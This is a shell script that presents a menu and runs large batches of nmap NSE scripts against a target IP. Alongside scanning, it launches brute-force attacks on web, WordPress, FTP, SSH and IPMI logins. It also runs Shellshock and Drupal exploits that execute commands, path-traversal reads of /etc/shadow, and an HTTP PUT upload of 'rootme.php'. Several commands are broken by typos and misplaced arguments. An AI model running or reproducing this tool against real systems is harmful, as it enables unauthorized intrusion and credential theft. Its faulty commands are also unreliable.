#!/bin/sh
#Info-gather script
#Code by DroPZsec
#

#COLORED_OUTPUT

blue='\033[94m'
red='\033[91m'
green='\033[92m'
orange='\033[93m'
reset='\e[0m'
magenta='\u001b[35m'
yellow='\u001b[33m'

# MENU CODE

clear
    sleep 1.0
echo $green "Loading Information gathering Menu..." $reset 
    sleep 1.0
clear
    sleep 0.25
echo $orange 
figlet -f small "Information Gathering Menu"
echo "" $reset 
echo "" 
echo ""
echo ""
echo "" 
echo $blue"1."$reset $orange")"$reset $green "Port and OS-service scan" $reset 
    sleep 0.25
echo $blue"2."$reset $orange")"$reset $green "fast Vulnereable-scan" $reset 
    sleep 0.25
echo $blue"3."$reset $orange")"$reset $green "Intense HTTP-Scan" $reset 
    sleep 0.25
echo $blue"4."$reset $orange")"$reset $green "Metasploit-Check" $reset 
    sleep 0.25
echo $blue"5."$reset $orange")"$reset $green "Intense Scan all Server-Devices" $reset 
    sleep 0.25
echo $blue"6."$reset $orange")"$reset $green "FTP Scan" $reset        
    sleep 0.25
echo $blue"7."$reset $orange")"$reset $green "SSH Scan" $reset       
    sleep 0.25
echo $blue"8."$reset $orange")"$reset $green "Geo-IP Scans" $reset 
    sleep 0.25
echo $blue"9."$reset $orange")"$reset $green "IPMI / UDP Script-Scans" $reset 
    sleep 0.25
echo $blue"10."$reset $orange")"$reset $green "EXIT" $reset 
    sleep 0.25
echo $green "Enter your choice:" $reset
    read answer;

if [ $answer = 1 ]; then
    echo $green "Enter Target IP:" $reset
        read ip;
    sudo nmap -Pn -sV -O $ip -d
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 2 ]; then
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn $ip --script vuln -d 
        read enter; 
fi
if [ $answer = 3 ]; then
        read ip;
    echo $green "Enter Target IP:" $reset 
        read ip;
     sudo nmap -Pn --script=http-apache-neogation --script args http-apache-neogation.root=/root/ $ip -d    
    sudo nmap -Pn -p80 --script http-apache-server-status $ip -d 
    sudo nmap -sV --script http-apache-server-status $ip -d
    sudo nmap -Pn --script http-aspnet-debug $ip -d    
    sudo nmap -Pn --script http-aspnet-debug --script-args http-aspnet-debug.path=/path $ip -d 
    sudo nmap -Pn -p80 --script http-auth-finder $ip -d    
    sudo nmap -Pn --acript http-auth -p80 $ip -d   
    sudo nmap -Pn --script http-auth --script-args http-auth.path=/login -p80 $ip -d    
    sudo nmap -Pn -p80 --script http-avaya-ipoffice-users $ip -d     
    sudo nmap -sV --script http-avaya-ipoffice-users $ip -d   
    sudo nmap -sV --script http-awstatstotal-exec.nse $ip -d     
    sudo nmap -sV --script http-awstatstotal-exec.nse  --script-args 'http-awstatstotal-exec.cmd="uname -a",http-awstatstotal-exec.uri=/awstats/index.php' $ip -d     
    sudo nmap -Pn -p 80,8080 --script http-axis2-dir-traversal --script-args 'http-axis2-dir-traversal.file=../../../../../../../etc/issue' $ip -d    
    sudo nmap -Pn -p80 --script http-axis2-dir-traversal $ip -d    
    sudo nmap -Pn -p80 --script=http-backup-finder $ip -d    
    sudo nmap -Pn --script http-barracuda-dir-traversal --script-args http-max-cache-size=5000000 -p80,443,8000,8080 $ip -d    
    sudo nmap -Pn -p 80,443,8000,8080 --script http-bigip-cookie $ip -d             
    sudo nmap -Pn -p80 --script http-brute $ip -d
    sudo nmap -Pn -p80,443 --script http-cakephp-version $ip -d     
    sudo nmap -Pn --script http-chrono $ip -d     
    sudo nmap -sV --script htttp-chrono $ip -d    
    sudo nmap -Pn -p80,443 --script http-cisco-anyconnect $ip -d    
    sudo nmap -sV --script http-coldfusion-subzero $ip -d    
    sudo nmap -p80 --script http-coldfusion-subzero --script-args basepath=/cf/ $ip -d    
    sudo nmap -p80 --script http-comments-displayer.nse $ip -d    
    sudo nmap -Pn --script http-config-backup $ip -d    
    sudo nmap -Pn -p443 --script http-cookie-flags $ip -d    
    sudo nmap -Pn -p 80 --script http-cors $ip -d        
    sudo nmap -Pn --script http-cross-domain-policy $ip -d           
    sudo nmap -Pn -p80 --script http-cross-domain-policy --script-args http-cross-domain-policy.domain-lookup=true $ip -d    
    sudo nmap -Pn -p80 --script http-csrf.nse $ip -d   
    sudo nmap -Pn -p80 --script http-default-accounts $ip -d     
    sudo nmap -Pn -p80 --script http-devframework.nse $ip -d       
    sudo nmap -sV --script http-dlink-backdoor $ip -d     
    sudo nmap -Pn -p80 --script http-dombased-xss.nse $ip -d       
    sudo nmap -Pn --script http-domino-enum-passwords -p80 $ip --script-args http-domino-enum-passords.username='patrik karlson',http-domino-enum-passwords.password=secret -d    
    sudo nmap -Pn -p80 --script http-drupal-enum $ip -d    
    sudo nmap -Pn --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" $ip -d    
    sudo nmap -Pn -p80 --script http-errors.nse $ip -d    
    sudo nmap -Pn -p80,443 --script http-exif-spider $ip -d    
    sudo nmap -Pn -p80 --script http-huawei-hg5xx-vuln $ip -d    
    sudo nmap -sV --script http-huawei-hg5xx-vuln $ip -d     
    sudo nmap -sn -Pn --script http-icloud-findmyiphone --script-args='username=<user>,password=<pass>' $ip -d     
    sudo nmap -Pn -p80 --script http-iis-short-name-brute $ip -d    
    sudo nmap -Pn -p 80,443 --script http-iis-webdav-vuln $ip -d     
    sudo nmap -Pn --script http-internal-ip-disclosure $ip -d    
    sudo nmap -Pn --script http-internal-ip-disclosure --script-args http-internal-ip-diclosure.path=/path $ip -d     
    sudo nmap -sV --script http-joomla-brute $ip -d    
    sudo nmap -Pn -p80 --script http-jsonp-detection $ip -d    
    sudo nmap -Pn -p80 --script http-litespeed-sourcecode-download --script-args http-litespeed-sourcecode-download.uri=/phpinfo.php $ip -d    
    sudo nmap -Pn -p8088 --script http-litespeed-sourcecode-download $ip -d  
    sudo nmap -n -p80 --script http-ls $ip -d    
    sudo nmap -Pn -p80 --script http-majordomo2-dir-traversal $ip -d    
    sudo nmap -Pn --script http-malware-host $ip -d    
    sudo nmap -Pn --script http-method $ip -d    
    sudo nmap -Pn --script http-method --script-args http-method-uri-path='/website' $ip -d    
    sudo nmap -sV --script http-method-tamper $ip -d    
    sudo nmap -Pn -p80 --script http-method-tamper --script-args 'http-method-tamper.paths={/protected/db.php,/protected/index.php}' $ip -d    
    sudo nmap -Pn -p80 --script http-mobileversion-checker.nse $ip -d     
    sudo nmap -Pn -p80 --script http-ntlm-info --script-args http-ntlm-info.root=/root/ $ip -d     
    sudo nmap -Pn --script http-open-proxy.nse $ip -d    
    sudo nmap -Pn --script http-open-redirect $ip -d  
    sudo nmap -Pn --script http-passwd --script-args http-passwd.root=/test/ $ip -d      
    sudo nmap -Pn --script http-phpmyadmin-dir-traversal $ip -d    
    sudo nmap -Pn -p80 --script http-phpself-xss $ip -d    
    sudo nmap -sV --script http-selfphp-xss $ip -d    
    sudo nmap -Pn --script http-php-version $ip -d    
    sudo nmap -Pn -p8080 --script http-proxy-brute $ip -d    
    sudo nmap -Pn -p80 --script http-put --script-args http-put.url='/uploads/rootme.php',http-put.file='/tmp/rootme.php' $ip -d     
    sudo nmap -Pn -p80,443 --script http-qnap-nas-info $ip -d    
    sudo nmap -Pn -p80 --script http-referer-checker $ip -d    
    sudo nmap -Pn -p80 --script http-rfi-spider $ip -d    
    sudo nmap -Pn -p80 --script http-robots.txt.nse $ip -d     
    sudo nmap -Pn --script http-robtex-reverse-ip $ip -d    
    sudo nmap -Pn --script http-robtex-shared-ns $ip -d    
    sudo nmap -Pn -p80 --script http-sap-netweaver-leak $ip -d    
    sudo nmap -sV --script http-sap-netweaver-leak $ip -d    
    sudo nmap -Pn -p80,443 --script http-sceurity-headers $ip -d    
    sudo nmap -Pn -p80,443 --script http-server-header $ip -d    
    sudo nmap -sV -p80,443 --script http-shellshock $ip -d    
    sudo nmap -sV -p80,443 --script http-shellshock --script-args http-shellshock.uri='/cgi-bin/bin',http-shellshock.cmd='ls' $ip -d    
    sudo nmap -Pn -p80 --script http-sitemap-generator $ip -d    
    sudo nmap -Pn --script http-slowloris-check $ip -d    
    sudo nmap -Pn -p 80,443 --script http-sql-injection.nse $ip -d    
    sudo nmap -Pn -p80,443 --script http-redirect.nse $ip -d    
    sudo nmap -Pn -p80 --script http-stored-xss $ip -d    
    sudo nmap -sV --script http-svn-enum.nse $ip -d    
    sudo nmap -sV --script http-svn-info $ip -d    
    sudo nmap -sV --script http-title.nse $ip -d    
    sudo nmap -Pn -p80 --script http-tplink-dir-traversal.nse $ip -d    
    sudo nmap -Pn -p80 -n --script http-tplink-dir-traversal.nse $ip -d    
    sudo nmap -Pn -p80 --script http-tplink-dir-traversal.nse --script-args http-tplink-dir-traversal.rfile='/etc/topology.conf' -n $ip -d    
    sudo nmap -sV --script http-trace.nse $ip -d    
    sudo nmap -sV --script http-traceroute.nse $ip -d    
    sudo nmap -Pn -p80 --script http-trane-info $ip -d    
    sudo nmap -sV --script http-unsafe-output-escaping $ip -d     
    sudo nmap -Pn -p80 --script http-useragent-tester $ip -d    
    sudo nmap -sV --script http-userdir-enum.nse $ip -d   
    sudo nmap -Pn -p80,443,8080 --script http-vhosts.nse $ip -d    
    sudo nmap -sV --script http-virustotal.nse --script-args='http-virustotal.apikey="<key>",http-virustotal.checksum="275a021bbfb6489e54d471899f7db9d1663fc695ec2fe2a2c4538aabf651fd0f"' $ip -d    
    sudo nmap -Pn -p54340 --script http-vlcstreamer-ls.nse $ip -d    
    sudo nmap -Pn -p80,443,8222,8333 --script http-vmware-path-vuln.nse $ip -d   
    sudo nmap -sV --script http-vuln-cve2006-3392.nse $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2006-3392.nse --script-args http-vuln-cve2006-3392.file='/etc/shadow' $ip -d   
    sudo nmap -sV --script hhtp-vuln-cve2009-3960 --script-args http-vuln-cve-2009-3960.root='/root/' $ip -d    
    sudo nmap -sV --script http-vuln-cve2010-0738 --script-args http-vuln-cve2010-0738.paths='{/path1/,/path2/}' $ip -d    
    sudo nmap -sV --script http-vuln-cve2010-2861 $ip -d    
    sudo nmap -p80,443 --script http-vuln-cve2011-3192.nse $ip -d      
    sudo nmap -sV --script http-vuln-cve2011-3368 $ip -d    
    sudo nmap -sV --script http-vuln-cve2012-1823.nse $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2012-1823.nse --script-args http-vuln-cve2012-1823.uri='/test.php' $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-0156.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-0156.nse --script-args http-vuln-cve2013-0156.uri='/test/' $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2013-6786.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-6786.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2013-7091.nse $ip -d
    sudo nmap -Pn -p80 --script http-vuln-cve2013-7091.nse --script-args http-vuln-cve2013-7091=/ZimBra $ip -d    
    sudo nmap -p443 --script http-vuln-cve2014-2126.nse $ip -d     
    sudo nmap -p443 --script http-vuln-cve2014-2127.nse $ip -d     
    sudo nmap -p443 --script http-vuln-cve2014-2128.nse $ip -d
    sudo nmap -p443 --script http-vuln-cve2014-2129.nse $ip -d 
    sudo nmap -sV --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.cmd="uname -a",http-vuln-cve2014-3704.uri="/drupal" $ip -d   
    sudo nmap -sV --script http-vuln-cve2014-3704 --script-args http-vuln-cve2014-3704.uri="/drupal",http-vuln-cve2014-3704.cleanup=false $ip -d
    sudo nmap -sV --script http-vuln-cve2014-8877 --script-args http-vuln-cve2014-8877.cmd="whoami",http-vuln-cve2014-8877.uri="/wordpress" $ip -d    
    sudo nmap -sV --script http-vuln-cve2014-8877 $ip -d    
    sudo nmap -sV --script http-vuln-cve2015-1427.nse --script-args http-vuln-cve2015-1427.command='ls' $ip -d    
    sudo nmap -sV --script http-vuln-cve2015-1635 $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2015-1635.nse $ip -d    
    sudo nmap -sV --script http-vuln-cve2015-1635 --script-args http-vuln-cve2015-1635.uri='/anotheruri/' $ip -d    
    sudo nmap -sV --script http-vuln-cve2017-1001000 --script-args http-vuln-cve100-1000="uri" $ip -d    
    sudo nmap -sV --script http-vuln-cve2017-1001000 $ip -d         
    sudo nmap -Pn -p80,443 --script http-vuln-cve2017-5638 $ip -d     
    sudo nmap -Pn -p16992 --script http-vuln-cve2017-5689 $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2017-8917 $ip -d    
    sudo nmap -Pn -p80 --script http-vuln-cve2017-8917 --script-args http-vuln-cve2017-8917.uri='/joomla/' $ip -d    
    sudo nmap -Pn -p7547 --script http-vuln-misfortune-cookie $ip -d     
    sudo nmap -sV -p80 --script http-vuln-wnr1000-creds $ip -d   
    sudo nmap -Pn -p80 --script http-waf-detect $ip -d    
    sudo nmap -Pn -p80 --script http-waf-detect --script-args http-waf-detect.aggro,http-wafdetect.uri='/testphp.vulnweb.com/artists.php' $ip -d    
    sudo nmap -sV --script http-waf-fingerprint $ip -d    
    sudo nmap -sV --script http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 $ip -d     
    sudo nmap -Pn -p80,8080 --script http-webdav-scan $ip -d    
    sudo nmap -sV --script http-wordpress-brute $ip -d    
    sudo nmap -sV --script http-wordpress-brute --script-args http-wordpress-brute.userdb='users.txt',http-wordpress-brute.hostname='domain.com',http-wordpress-brute.threads=3,brute.firstonly='true' $ip -d
    sudo nmap -sV --script http-wordpress-enum $ip -d    
    sudo nmap -sV --script http-wordpress-enum --script-args type="themes" $ip -d    
    sudo nmap -Pn -p80 --script http-wordpress-users $ip -d    
    sudo nmap -sV --script http-wordpress-users --script-args limit=50 $ip -d    
    sudo nmap -Pn -p80 --script http-xssed $ip -d               
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi  
if [ $answer = 4 ]; then
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo -Pn nmap $ip --script=metasploit-info --script-args username=root,password=root -d 
    echo $green "Press Enter to continue..." $reset
        read enter;
fi
if [ $answer = 5 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -T4 -Pn -A $ip --traceroute -d
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi 
if [ $answer = 6 ]; then 
    echo $green "Enter Target IP:" $reset 
        sudo nmap -Pn -p21 $ip --script ftp-syst.nse -d
        sudo nmap -Pn -p21 $ip --script ftp-anon.nse -d
        sudo nmap -Pn -p21 $ip --script ftp-brute.nse -d
        sudo nmap -Pn -p21 $ip --script ftp-vsftpd-backdoor.nse -d
        sudo nmap -Pn -p21 $ip --script ftp-proftpd-backdoor.nse -d
        sudo nmap -Pn -p21 $ip --script ftp-vuln-cve2010-4221.nse -d
    echo $green "Press Enter to continue..." $reset 
        read enter;
fi 
if [ $answer = 7 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -Pn -p22 $ip --script ssh-run.nse -d
    sudo nmap -Pn -p22 $ip --script sshv1.nse -d 
    sudo nmap -Pn -p22 $ip --script sshv2.nse  -d
    sudo nmap -Pn -p22 $ip --script ssh-brute.nse -d
    sudo nmap -Pn -p22 $ip --script ssh-hostkey --script-args ssh_hostkey=all -d 
    sudo nmap -Pn -p22 $ip --script ssh2-enum-algos -d
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 8 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
    sudo nmap -sn $ip --script ip-forwarding -d 
    sudo nmap -sV --script ip-geolocation-geoplugin $ip -d 
    sudo nmap -sV --script ip-geolocation-ipinfodb $ip -d
    sudo nmap -Pn -sn --script ip-geolocation-map-bing --script-args ip-geolocation-map-bing.path=map.png $ip -d    
    sudo nmap -Pn -sn --script ip-geolocation-map-google --script-args ip-geolocation-map-google.path=map-google.png $ip -d 
    sudo nmap -Pn -sn --script ip-geolocation-map-kml --script-args ip-geolocation-map-kml.path=map-kml.png $ip -d
    sudo nmap -sV --script ip-geolocation-maxmind $ip -d
    nmap -sV --script ip-https-discover $ip -d  
    echo $green "Press ENTER to continue..." $reset 
        read enter;
fi
if [ $answer = 9 ]; then 
    echo $green "Enter Target IP:" $reset 
        read ip;
        sudo nmap -sU --script ipmi-brute -p 623 $ip -d
        sudo nmap -sU --script ipmi-cipher-zero -p 623 $ip -d
        sudo nmap -sU --script ipmi-version -p 623 $ip -d
        echo $green "Press ENTER to continue..."
            read enter;
fi 
if [ $answer = 10 ]; then 
    echo $green "OK, Youre Choice..."
        sleep 1.0
    clear
    echo $blue
    figlet -f small "Info-Gather script"
        sleep 0.5 
    figlet -f small "coded by:"
    echo $reset $orange 
        sleep 1.0 
    figlet -f big "vDroPZz"
        sleep 1.0
    clear 
    echo $reset $blue  
    figlet -f small "Follow me on Github:"
    echo $reset $orange 
        sleep 0.5 
    figlet -f big "DroPZsec"
        sleep 1.5 
    clear 
    echo $reset 
    cd ..
    ./BashAttack.sh  
fi 
./info-gather.sh
/bin/sh